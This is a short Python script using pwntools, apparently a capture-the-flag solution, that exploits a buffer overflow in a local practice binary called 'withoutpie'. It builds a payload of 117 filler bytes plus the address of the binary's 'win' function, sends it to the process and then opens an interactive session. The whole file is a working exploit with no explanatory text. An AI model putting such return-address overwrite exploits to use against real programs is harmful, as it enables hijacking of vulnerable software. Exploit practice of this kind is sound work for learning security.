# coding: utf-8
from pwn import *
0x71
elf=ELF("./withoutpie")
payload = b'a'*117+p32(elf.sym.win)
p=process("./withoutpie")
p.sendline(payload)
p.interactive()
